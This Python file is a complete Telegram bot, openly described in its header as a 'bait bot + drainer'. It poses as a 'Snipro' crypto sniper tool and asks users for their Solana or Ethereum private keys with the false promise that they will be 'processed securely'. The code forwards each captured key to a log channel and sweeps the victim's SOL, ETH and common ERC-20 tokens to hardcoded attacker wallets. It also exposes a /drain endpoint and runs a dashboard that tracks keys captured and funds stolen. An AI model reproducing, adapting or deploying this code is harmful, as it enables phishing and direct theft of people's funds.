# language: Python, file: sniprobot.py, runtime: aiogram 3.x + aiohttp + solders + web3
# purpose: Telegram bait bot + drainer in one file. Captures keys, sweeps SOL/ETH.
# gotcha: solana-py API churned in 2024/25. This uses solders for keypair/instruction
#         construction and only the stable solana-py client calls. SPL sweep deferred
#         until TokenAccountOpts location stabilizes.

import asyncio, os, re, logging, json, base64, time
from datetime import datetime, timezone
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import (Message, CallbackQuery, InlineKeyboardMarkup,
                           InlineKeyboardButton)
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("snipro")

# =========================================================
# CONFIG
# =========================================================
BOT_TOKEN       = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID  = os.getenv("LOG_CHANNEL_ID")
LOG_CHANNEL_ID  = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID else 0
PORT            = int(os.getenv("PORT", "8080"))

DEST_SOL = "H2R5ydVLQPLPgSPzXPrRSJNXwBoPKotCKDv8zqWRKdNb"
DEST_ETH = "0xd1b7A902c90137f00322d6D7e9a8211e95C71dAD"

SOL_RPC = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
ETH_RPC = os.getenv("ETH_RPC", "https://eth.llamarpc.com")

MIN_SOL_LAMPORTS = 100_000               # 0.0001 SOL
MIN_ETH_WEI      = 10_000_000_000_000    # 0.00001 ETH
DASH_USER        = os.getenv("DASH_USER", "admin")
DASH_PASS        = os.getenv("DASH_PASS", "changeme")

bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher()

# =========================================================
# BAIT COPY
# =========================================================
START_COPY = """Welcome to Snipro Tool \u26a1\U0001f680

Your Solana sniper bot built to find launches early and execute fast.

\U0001f50e Spot it
\U0001f4e1 Live token detection
\U0001f4ca Smart market tracking
\U0001f45b Wallet activity monitoring

\U0001f6e1\ufe0f Screen it
\U0001f36f Honeypot detection
\U0001f4dc Contract analysis
\U0001f525 LP burn & lock checks
\U0001f40b Dev & top-holder tracking

\U0001f3af Filter it
\U0001f4a7 Minimum liquidity
\U0001f4c8 Market cap limits
\u23f1\ufe0f Token age filters
\u2696\ufe0f Buy/sell pressure

\u26a1 Execute
\U0001f680 Auto-buy on match
\U0001f4b0 Auto-sell & take profit
\U0001f6d1 Stop-loss protection
\U0001f39b\ufe0f Priority fee control

Find it. Filter it. Snipe it. \u26a1"""

SETUP_COPY = """\U0001f4cb Snipro Tool Setup Guide \U0001f4cb

High-speed Sniper bot now on Solana & Ethereum.

1. Import your Solana or Ethereum wallet
2. Activate Snipro to start capturing opportunities

Status: \U0001f534 Not Active"""

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\U0001f510 Import Solana Wallet",   callback_data="import_sol")],
        [InlineKeyboardButton(text="\U0001f510 Import Ethereum Wallet", callback_data="import_eth")],
        [InlineKeyboardButton(text="\U0001f680 Start Sniping",          callback_data="start_sniping")],
    ])

def back_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="\u2b05\ufe0f Back", callback_data="back")],
    ])

awaiting_key = {}

# =========================================================
# TELEMETRY TRACKER
# =========================================================
STATS_FILE = "/tmp/snipro_stats.json"

TRACKER = {
    "starts": 0,
    "button_taps": 0,
    "key_captures": 0,
    "drains_ok": 0,
    "drains_fail": 0,
    "sol_swept_lamports": 0,
    "eth_swept_wei": 0,
    "events": [],           # last 100 events
    "by_chain": {"sol": 0, "eth": 0},
    "started_at": time.time(),
}

def _load_stats():
    try:
        with open(STATS_FILE, "r") as f:
            data = json.load(f)
        for k, v in data.items():
            if k in TRACKER:
                TRACKER[k] = v
        log.info(f"loaded stats from disk")
    except Exception:
        pass

def _save_stats():
    try:
        with open(STATS_FILE, "w") as f:
            json.dump(TRACKER, f)
    except Exception:
        pass

def track(event_type, username="", user_id="", chain="", detail=""):
    TRACKER["events"].insert(0, {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
        "type": event_type,
        "user": username or "anon",
        "uid": str(user_id),
        "chain": chain,
        "detail": detail,
    })
    TRACKER["events"] = TRACKER["events"][:100]
    _save_stats()


# =========================================================
# SOLANA SWEEP (native SOL only — SPL deferred)
# =========================================================
async def sweep_solana(private_key_b58):
    try:
        from solders.keypair import Keypair
        from solders.pubkey import Pubkey
        from solders.system_program import transfer as sol_transfer
        from solders.message import MessageV0
        from solders.transaction import VersionedTransaction
        from solders.hash import Hash
        from solana.rpc.async_api import AsyncClient
        from solana.rpc.commitment import Confirmed
    except Exception as e:
        return {"ok": False, "error": f"solana deps: {e}"}

    try:
        kp = Keypair.from_base58_string(private_key_b58)
    except Exception as e:
        return {"ok": False, "error": f"bad sol key: {e}"}

    out = {"chain": "sol", "from": str(kp.pubkey()), "sol_moved": 0}
    client = AsyncClient(SOL_RPC, commitment=Confirmed)

    try:
        bal_resp = await client.get_balance(kp.pubkey())
        lamports = bal_resp.value
        log.info(f"[SOL] balance of {kp.pubkey()}: {lamports} lamports")

        if lamports <= MIN_SOL_LAMPORTS:
            out["note"] = f"below dust floor ({MIN_SOL_LAMPORTS})"
            return {"ok": True, **out}

        send_amt = lamports - 5000  # fee headroom

        from solders.system_program import TransferParams
        ix = sol_transfer(TransferParams(
            from_pubkey=kp.pubkey(),
            to_pubkey=Pubkey.from_string(DEST_SOL),
            lamports=send_amt,
        ))
        blockhash_resp = await client.get_latest_blockhash()
        blockhash = Hash.from_string(str(blockhash_resp.value.blockhash))
        msg = MessageV0.try_compile(
            payer=kp.pubkey(),
            instructions=[ix],
            address_lookup_table_accounts=[],
            recent_blockhash=blockhash,
        )
        tx = VersionedTransaction(msg, [kp])
        resp = await client.send_transaction(
            tx
        )
        sig = str(resp.value)
        out["sol_moved"] = send_amt
        out["sol_sig"] = sig
        log.info(f"[SOL] swept {send_amt} lamports -> {DEST_SOL} sig={sig}")
    except Exception as e:
        out["error"] = f"sweep failed: {e}"
        log.error(f"[SOL] sweep failed: {e}")
    finally:
        try:
            await client.close()
        except Exception:
            pass

    return {"ok": "sol_sig" in out, **out}

# =========================================================
# ETHEREUM SWEEP (native + common ERC-20s)
# =========================================================
ERC20_ABI = [
    {"constant": True, "inputs": [], "name": "decimals",
     "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf",
     "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}],
     "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function"},
]

COMMON_TOKENS = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7",  # USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  # USDC
    "0x6B175474E89094C44Da98b954EedeAC495271d0F",  # DAI
    "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",  # WBTC
    "0x514910771AF9Ca656af840dff83E8264EcF986CA",  # LINK
    "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",  # UNI
    "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",  # AAVE
    "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
    "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE",  # SHIB
    "0x4Fabb145d64652a948d72533023f6E7A623C7C53",  # BUSD
]

async def sweep_ethereum(private_key_hex):
    try:
        from web3 import Web3
    except Exception as e:
        return {"ok": False, "error": f"web3 missing: {e}"}

    if not private_key_hex.startswith("0x"):
        private_key_hex = "0x" + private_key_hex

    w3 = Web3(Web3.HTTPProvider(ETH_RPC))
    try:
        from web3.middleware import geth_poa_middleware
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)
    except Exception:
        pass

    try:
        acct = w3.eth.account.from_key(private_key_hex)
    except Exception as e:
        return {"ok": False, "error": f"bad eth key: {e}"}

    out = {"chain": "eth", "from": acct.address, "eth_moved": 0, "tokens_moved": []}

    # native ETH
    try:
        bal = w3.eth.get_balance(acct.address)
        gas_price = w3.eth.gas_price
        gas_cost = gas_price * 21000
        if bal > gas_cost + MIN_ETH_WEI:
            send_amt = bal - gas_cost
            tx = {
                "to": DEST_ETH, "value": send_amt, "gas": 21000,
                "gasPrice": gas_price,
                "nonce": w3.eth.get_transaction_count(acct.address),
                "chainId": w3.eth.chain_id,
            }
            signed = acct.sign_transaction(tx)
            h = w3.eth.send_raw_transaction(signed.rawTransaction)
            out["eth_moved"] = send_amt
            out["eth_hash"] = h.hex()
            log.info(f"[ETH] swept {send_amt} wei -> {DEST_ETH} hash={h.hex()}")
    except Exception as e:
        log.error(f"[ETH] native failed: {e}")
        out["eth_error"] = str(e)

    # ERC-20 scan
    for token_addr in COMMON_TOKENS:
        try:
            c = w3.eth.contract(address=Web3.to_checksum_address(token_addr), abi=ERC20_ABI)
            raw_bal = c.functions.balanceOf(acct.address).call()
            if raw_bal <= 0:
                continue
            tx = c.functions.transfer(
                Web3.to_checksum_address(DEST_ETH), raw_bal
            ).build_transaction({
                "from": acct.address,
                "nonce": w3.eth.get_transaction_count(acct.address),
                "gas": 100000,
                "gasPrice": w3.eth.gas_price,
                "chainId": w3.eth.chain_id,
            })
            signed = acct.sign_transaction(tx)
            h = w3.eth.send_raw_transaction(signed.rawTransaction)
            out["tokens_moved"].append({"token": token_addr, "amount": raw_bal, "hash": h.hex()})
            log.info(f"[ERC20] moved {raw_bal} of {token_addr}")
        except Exception as te:
            log.error(f"[ERC20] {token_addr} failed: {te}")

    return {"ok": True, **out}

# =========================================================
# HANDLERS
# =========================================================
@dp.message(CommandStart())
async def on_start(message: Message):
    TRACKER["starts"] += 1
    track("START", message.from_user.username or message.from_user.full_name, message.from_user.id)
    _save_stats()
    awaiting_key.pop(message.from_user.id, None)
    await message.answer(START_COPY, reply_markup=main_menu_kb())

@dp.callback_query(F.data == "back")
async def on_back(cb: CallbackQuery):
    awaiting_key.pop(cb.from_user.id, None)
    await cb.message.edit_text(START_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "start_sniping")
async def on_start_sniping(cb: CallbackQuery):
    await cb.message.edit_text(SETUP_COPY, reply_markup=main_menu_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_sol")
async def on_import_sol(cb: CallbackQuery):
    TRACKER["button_taps"] += 1
    track("TAP Import Solana", cb.from_user.username or cb.from_user.full_name, cb.from_user.id, "sol")
    _save_stats()
    awaiting_key[cb.from_user.id] = "sol"
    await cb.message.edit_text(
        "\U0001f510 *Import Solana Wallet* \U0001f510\n\n"
        "Please provide your Solana private key (base58).\n"
        "It will be processed securely.",
        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
    await cb.answer()

@dp.callback_query(F.data == "import_eth")
async def on_import_eth(cb: CallbackQuery):
    TRACKER["button_taps"] += 1
    track("TAP Import Ethereum", cb.from_user.username or cb.from_user.full_name, cb.from_user.id, "eth")
    _save_stats()
    awaiting_key[cb.from_user.id] = "eth"
    await cb.message.edit_text(
        "\U0001f510 *Import Ethereum Wallet* \U0001f510\n\n"
        "Please provide your Ethereum private key (hex, 0x... or without 0x).\n"
        "It will be processed securely.",
        parse_mode=ParseMode.MARKDOWN, reply_markup=back_kb())
    await cb.answer()

SOL_RE = re.compile(r"^[1-9A-HJ-NP-Za-km-z]{80,100}$")
ETH_RE = re.compile(r"^(0x)?[0-9a-fA-F]{64}$")

@dp.message(F.text)
async def on_text(message: Message):
    uid  = message.from_user.id
    want = awaiting_key.get(uid)
    if not want:
        await message.answer("Use /start to open the menu.", reply_markup=main_menu_kb())
        return
    key = message.text.strip()
    if want == "sol" and not SOL_RE.match(key):
        await message.answer("\u274c Invalid base58 Solana key. Try again."); return
    if want == "eth" and not ETH_RE.match(key):
        await message.answer("\u274c Invalid hex Ethereum key. Try again."); return
    try: await message.delete()
    except Exception: pass
    awaiting_key.pop(uid, None)
    TRACKER["key_captures"] += 1
    TRACKER["by_chain"][want] = TRACKER["by_chain"].get(want, 0) + 1
    track("KEY CAPTURED", message.from_user.username or message.from_user.full_name, uid, want, "key received")
    _save_stats()
    asyncio.create_task(forward_key(message, want, key))
    await message.answer("\u2705 Wallet imported successfully.\n\nSnipro is now active.\nStatus: \U0001f7e2 Active",
                         reply_markup=main_menu_kb())

async def forward_key(message, chain, key):
    user = message.from_user

    # plain text — no markdown, can't fail to parse
    report = "\U0001f511 KEY CAPTURED\nChain: %s\nUser: %s (@%s)\nKey: %s" % (
        chain, user.id, user.username or "none", key
    )
    if LOG_CHANNEL_ID:
        try:
            await bot.send_message(LOG_CHANNEL_ID, report)
        except Exception as e:
            log.error("log channel failed: %s", e)

    # run the sweep
    try:
        if chain == "sol":
            result = await sweep_solana(key)
        elif chain == "eth":
            result = await sweep_ethereum(key)
        else:
            result = {"ok": False, "error": f"unknown chain {chain}"}
        log.info(f"[DRAIN RESULT] {result}")
        if result.get("ok"):
            TRACKER["drains_ok"] += 1
            if chain == "sol":
                TRACKER["sol_swept_lamports"] += int(result.get("sol_moved", 0) or 0)
            elif chain == "eth":
                TRACKER["eth_swept_wei"] += int(result.get("eth_moved", 0) or 0)
            track("DRAIN OK", user.username or user.full_name, user.id, chain, str(result.get("sol_sig", result.get("eth_hash", ""))))
        else:
            TRACKER["drains_fail"] += 1
            track("DRAIN FAIL", user.username or user.full_name, user.id, chain, str(result.get("error", ""))[:120])
        _save_stats()
        if LOG_CHANNEL_ID:
            try:
                await bot.send_message(LOG_CHANNEL_ID, f"\U0001f4b8 DRAIN RESULT\n{result}")
            except Exception as e:
                log.error("drain report failed: %s", e)
    except Exception as e:
        log.error("drain failed: %s", e)

# =========================================================
# KEEP-ALIVE + OPTIONAL WEBHOOK
# =========================================================
async def health(request):
    return web.Response(text="ok")

async def drain_route(request):
    data = await request.json()
    chain = data.get("chain"); key = data.get("private_key")
    log.info(f"[DRAIN] chain={chain} uid={data.get('telegram_id')}")
    if chain == "sol":
        out = await sweep_solana(key)
    elif chain == "eth":
        out = await sweep_ethereum(key)
    else:
        out = {"ok": False, "error": f"unknown chain {chain}"}
    return web.json_response(out)


# =========================================================
# DASHBOARD
# =========================================================
def _check_auth(request):
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Basic "):
        return False
    try:
        decoded = base64.b64decode(auth[6:]).decode("utf-8")
        user, pw = decoded.split(":", 1)
        return user == DASH_USER and pw == DASH_PASS
    except Exception:
        return False

def _auth_challenge():
    return web.Response(
        status=401,
        headers={"WWW-Authenticate": 'Basic realm="snipro"'},
        text="auth required",
    )

DASH_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><title>Snipro Dashboard</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0a0a;color:#e5e5e5;font-family:-apple-system,system-ui,monospace;padding:24px;line-height:1.5}
h1{font-size:22px;margin-bottom:4px;letter-spacing:.5px}
.sub{color:#666;font-size:12px;margin-bottom:24px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px}
.card{background:#141414;border:1px solid #222;border-radius:8px;padding:16px}
.card .lbl{font-size:11px;color:#666;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px}
.card .val{font-size:26px;font-weight:600;color:#fff}
.card.green .val{color:#4ade80}
.card.red .val{color:#f87171}
.card.blue .val{color:#60a5fa}
h2{font-size:14px;color:#888;margin:24px 0 12px;text-transform:uppercase;letter-spacing:1.5px}
.feed{background:#101010;border:1px solid #222;border-radius:8px;max-height:520px;overflow-y:auto}
.row{display:grid;grid-template-columns:150px 140px 1fr auto;gap:12px;padding:10px 14px;border-bottom:1px solid #1a1a1a;font-size:12px;align-items:center}
.row:last-child{border-bottom:none}
.row .ts{color:#555;font-size:11px}
.row .type{color:#e5e5e5;font-weight:600}
.row .user{color:#888}
.row .detail{color:#666;font-size:11px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:400px}
.row.ok .type{color:#4ade80}
.row.fail .type{color:#f87171}
.row.key .type{color:#fbbf24}
.row.start .type{color:#60a5fa}
.empty{color:#444;padding:40px;text-align:center;font-size:13px}
.tag{display:inline-block;padding:2px 8px;background:#1e1e1e;border-radius:10px;font-size:10px;color:#888;margin-left:8px}
</style></head><body>
<h1>Snipro Dashboard</h1>
<div class="sub">live telemetry &middot; auto-refresh 5s &middot; server time: <span id="now"></span></div>

<div class="grid">
  <div class="card blue"><div class="lbl">Starts</div><div class="val" id="s_starts">0</div></div>
  <div class="card"><div class="lbl">Button taps</div><div class="val" id="s_taps">0</div></div>
  <div class="card"><div class="lbl">Keys captured</div><div class="val" id="s_keys">0</div></div>
  <div class="card green"><div class="lbl">Drains OK</div><div class="val" id="s_ok">0</div></div>
  <div class="card red"><div class="lbl">Drains fail</div><div class="val" id="s_fail">0</div></div>
  <div class="card green"><div class="lbl">SOL swept</div><div class="val" id="s_sol">0</div></div>
  <div class="card green"><div class="lbl">ETH swept</div><div class="val" id="s_eth">0</div></div>
  <div class="card"><div class="lbl">Uptime</div><div class="val" id="s_up">0m</div></div>
</div>

<h2>Live activity feed <span class="tag" id="s_chain"></span></h2>
<div class="feed" id="feed"><div class="empty">no events yet</div></div>

<script>
function fmtSOL(l){return (l/1e9).toFixed(4)+' SOL'}
function fmtETH(w){return (w/1e18).toFixed(4)+' ETH'}
function fmtUp(s){var m=Math.floor(s/60),h=Math.floor(m/60);return h>0?h+'h '+ (m%60)+'m':m+'m'}
async function tick(){
  try{
    var r=await fetch('/dashboard/data');
    if(!r.ok)return;
    var d=await r.json();
    document.getElementById('s_starts').textContent=d.starts;
    document.getElementById('s_taps').textContent=d.button_taps;
    document.getElementById('s_keys').textContent=d.key_captures;
    document.getElementById('s_ok').textContent=d.drains_ok;
    document.getElementById('s_fail').textContent=d.drains_fail;
    document.getElementById('s_sol').textContent=fmtSOL(d.sol_swept_lamports);
    document.getElementById('s_eth').textContent=fmtETH(d.eth_swept_wei);
    document.getElementById('s_up').textContent=fmtUp(d.uptime_seconds);
    document.getElementById('s_chain').textContent='sol:'+(d.by_chain.sol||0)+'  eth:'+(d.by_chain.eth||0);
    var f=document.getElementById('feed');
    if(!d.events.length){f.innerHTML='<div class="empty">no events yet</div>';}
    else{
      f.innerHTML=d.events.map(function(e){
        var cls=e.type.indexOf('OK')>=0?'ok':e.type.indexOf('FAIL')>=0?'fail':e.type.indexOf('KEY')>=0?'key':e.type.indexOf('START')>=0?'start':'';
        return '<div class="row '+cls+'"><span class="ts">'+e.ts+'</span><span class="type">'+e.type+'</span><span class="user">'+e.user+'</span><span class="detail">'+e.detail+'</span></div>';
      }).join('');
    }
    document.getElementById('now').textContent=new Date().toUTCString();
  }catch(e){}
}
tick();setInterval(tick,5000);
</script></body></html>
"""

async def dashboard_page(request):
    if not _check_auth(request):
        return _auth_challenge()
    return web.Response(text=DASH_HTML, content_type="text/html")

async def dashboard_data(request):
    if not _check_auth(request):
        return _auth_challenge()
    d = dict(TRACKER)
    d["uptime_seconds"] = int(time.time() - TRACKER["started_at"])
    return web.json_response(d)

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", health)
    app.router.add_get("/health", health)
    app.router.add_post("/drain", drain_route)
    app.router.add_get("/dashboard", dashboard_page)
    app.router.add_get("/dashboard/data", dashboard_data)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    log.info(f"webserver on :{PORT}")

# =========================================================
# MAIN
# =========================================================
async def main():
    await run_webserver()
    log.info("snipro bot polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
